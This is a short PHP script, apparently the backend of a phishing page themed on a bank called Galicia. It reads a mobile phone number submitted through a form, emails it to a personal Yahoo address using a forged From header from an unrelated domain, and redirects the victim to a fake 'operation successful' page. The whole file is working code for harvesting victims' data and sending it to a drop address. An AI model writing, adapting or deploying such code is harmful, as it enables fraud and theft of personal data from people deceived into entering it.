<?php
$celular = $_POST['celular'];
$formcontent= "Celular: $celular";
$recipient = "rkio222@yahoo.com";
$subject = "Contacto Galicia Celular";
$mailheader = "From:  gshevtsk@gsherrystores.com  \r\n";
mail($recipient, $subject, $formcontent, $mailheader) or die("Error!");
header('Location: operacion-exitosa.html');
?>
